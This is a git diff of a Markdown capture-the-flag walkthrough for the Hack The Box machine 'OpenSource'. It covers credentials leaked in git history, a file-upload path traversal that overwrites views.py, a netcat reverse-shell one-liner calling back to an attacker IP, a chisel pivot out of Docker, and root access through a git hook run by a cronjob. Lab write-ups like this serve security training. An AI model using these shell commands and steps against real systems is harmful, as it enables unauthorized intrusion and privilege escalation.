@@ -12,7 +12,6 @@ image:
 ---
 
 # Overview 
-
 This machine is hosting a webpage that allows user to test a file upload web application and download its source code. However, the source code is archived together with a directory .git, revealing user credentials. 
 
 Also, after analzying the source code, there is a way to exploit the file upload application due to the lack of/insufficient user input sanitization. The exploit is done by adding a remote code execution functionality into views.py from the source code and replacing it w/ the webpage's via the file upload test instance, allowing us to obtain a shell.
@@ -23,40 +22,34 @@ On the system, pspy64 revealed that there is a cronjob running as root executing
 
 ---
 
-| Column       | Details                                           |
-|--------------|---------------------------------------------------|
-| Box Name     | OpenSource                                        |
-| IP           | 10.10.11.164                                      |
-| Points       | -                                                 |
-| Difficulty   | Easy                                              |
-| Creator      | [irogir](https://app.hackthebox.com/users/476556) |
-| Release Date | 22-May-2022                                       |
+| Column       | Details      |
+| ------------ | ------------ |
+| Box Name     | OpenSource   |
+| IP           | 10.10.11.164 |
+| Points       | -            |
+| Difficulty   | Easy         |
+| Creator      | [irogir](https://app.hackthebox.com/users/476556)          |
+| Release Date |   22-May-2022           |
+
+
 
 # Recon
 
-
 ## TCP/80 (HTTP)
-
 ### FFUF
-
 ```
 200      GET       45l      144w     1563c http://10.10.11.164/console
 200      GET     9803l    56722w  2489147c http://10.10.11.164/download
 ```
-
 - `console`
 - `download`
 
-
 ## TCP/3000 (?)
-
 - Filtered
 
 # Initial Foothold
 
-
 ## TCP/80 (HTTP) - .git Directory
-
 1. Proceed to `http://10.10.11.164`	
 	![](Pasted%20image%2020220622192252.png)
 	- We are able download and view the source code by clicking the download button
@@ -97,9 +90,7 @@ On the system, pspy64 revealed that there is a cronjob running as root executing
 	Date:   Thu Apr 28 13:45:17 2022 +0200
 
 	```
-
 5. After viewing the commits, commit `a76f8f75f7a4a12b706b0cf9c983796fa1985820` contains sensitive information
-
 	``` 
 	┌──(root💀kali)-[~/htb/open_source/10.10.11.164/loot/.git]
 	└─# git show a76f8f75f7a4a12b706b0cf9c983796fa1985820
@@ -152,15 +143,12 @@ On the system, pspy64 revealed that there is a cronjob running as root executing
 	+    return send_file(os.path.join(os.getcwd(), "public", "uploads", path))
 
 	```
-
 	- dev01:Soulless_Developer#2022
 6. Proceed to `http://10.10.11.164/upcloud` & attempt to upload `php-reverse-shell.php`
 	![](Pasted%20image%2020220622212605.png)
 7. However visiting `http://10.10.11.164/uploads/php-reverse-shell.php` does not execute the reverse shell, instead the file is downloaded
 
-
 ## TCP/80 (HTTP) - Exploiting Upcloud by analyzing the source code
-
 1. After browsing through the source code, found a way to exploit the application
 	- `views.py`
 		![](Pasted%20image%2020220622205247.png)
@@ -168,7 +156,6 @@ On the system, pspy64 revealed that there is a cronjob running as root executing
 		![](Pasted%20image%2020220622205458.png)
 		- `../` is replaced
 2. `os.path.join` is exploitable 
-
 	``` 
 
 	Source: https://www.geeksforgeeks.org/python-os-path-join-method/
@@ -223,7 +210,6 @@ On the system, pspy64 revealed that there is a cronjob running as root executing
 	# along with the concatenated value
 
 	```
-
 	- We are able to upload a file wherever we want since we are able to **throw away the previous path** `public` & `upload` 
 	- For e.g. we wish to upload a file to /home directory, we have to name our file
 		- `/home/test.txt`
@@ -240,28 +226,21 @@ On the system, pspy64 revealed that there is a cronjob running as root executing
 	- Server is pinging our machine
 7. Reverse shell payload
 	- Reverse Shell
-
 	``` 
 	rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.82 4444 >/tmp/f
 	```
-
 	- URL Encoded
-
 	``` 
 	rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.14.82%204444%20%3E%2Ftmp%2Ff
 	```
-
 8. Obtain shell
 	![](vmware_EgRtOFfRY8.gif)
 
 # Privilege Escalation
 
-
 ## Dev01 - Docker Escape + Pivot
-
 1. After looking through the forums for help, I found out that we have to pivot to another machine in order to access TCP/3000 where it was filtered during our NMAP scan
 2. Proceed to `/`, we are in a docker environment
-
 	``` 
 	/ # ls -la
 	total 72
@@ -287,9 +266,7 @@ On the system, pspy64 revealed that there is a cronjob running as root executing
 	drwxr-xr-x    1 root     root          4096 May  4 16:35 usr
 	drwxr-xr-x    1 root     root          4096 May  4 16:35 var
 	```
-
 3. Find out the IP address of the machine we just compromised
-
 	``` 
 	/app # 	ifconfig
 	eth0      Link encap:Ethernet  HWaddr 02:42:AC:11:00:02  
@@ -310,30 +287,22 @@ On the system, pspy64 revealed that there is a cronjob running as root executing
 
 	/app # 
 	```
-
 4. Some information about docker escape
 	- https://blog.pentesteracademy.com/abusing-sys-module-capability-to-perform-docker-container-breakout-cf5c29956edd
-
 	>The IP address of the docker container is 172.17.0.2 and the host machine mostly creates an interface that acts as a gateway for the Docker network. And, generally, the first IP address of the range is used for that i.e. 172.17.0.1 in this case.
-
 5. We are trying to pivot into the actual machine, so instead of using IP `172.17.0.2`, we use `172.17.0.1`, as the docker container `172.17.0.2` is unable to communicate with our Kali machine directly. (Im not very sure about this)
 6. Use chisel to pivot
 	1. Kali
-
 		``` 
 		┌──(root💀kali)-[~/tools/chisel]
 		└─# chisel server --reverse --port 1337
 		```
-
 	2. Target
-
 		``` 
 		/app # ./chiselLinux64 client 10.10.14.16:1337 R:8888:172.17.0.1:3000 &
 		```
-
 		![](Pasted%20image%2020220623002006.png)
-
-7. Access the newly opened port 
+1. Access the newly opened port 
 	![](Pasted%20image%2020220623002101.png)
 8. Found a familiar username
 	![](Pasted%20image%2020220623002136.png)
@@ -341,10 +310,9 @@ On the system, pspy64 revealed that there is a cronjob running as root executing
 	- `dev01:Soulless_Developer#2022`
 10. Successfully login
 	![](Pasted%20image%2020220623002309.png)
-11. Found SSH private key
+12. Found SSH private key
 	![](Pasted%20image%2020220623003350.png)
-12. SSH w/ found private key
-
+13. SSH w/ found private key
 	``` 
 	┌──(root💀kali)-[~/htb/open_source]
 	└─# mv id_rsa.txt id_rsa
@@ -352,12 +320,11 @@ On the system, pspy64 revealed that there is a cronjob running as root executing
 	┌──(root💀kali)-[~/htb/open_source]
 	└─# ssh -i id_rsa dev01@10.10.11.164
 	```
-
 	![](Pasted%20image%2020220623003447.png)
 
 
-## Root - Via Cronjob
 
+## Root - Via Cronjob
 1. Ran linpeas, did not find any vulnerabilities to exploit
 2. Ran `pspy64` to sniff root processes, found an interesting process that is executed periodically
 	![](Pasted%20image%2020220623015528.png)
@@ -369,12 +336,10 @@ On the system, pspy64 revealed that there is a cronjob running as root executing
 	- https://www.atlassian.com/git/tutorials/git-hooks
 6. Create `pre-commit` and make it executable 
 	![](Pasted%20image%2020220623011505.png)
-
 	``` 
 	dev01@opensource:~/.git/hooks$ chmod +x pre-commit
 
 	```
-
 7. Wait for cronjob to execute
 	![](Pasted%20image%2020220623015238.png)
 8. Root obtained
@@ -418,3 +383,8 @@ On the system, pspy64 revealed that there is a cronjob running as root executing
 	^C
 	root@opensource:~# 
 	```
+
+
+
+
+
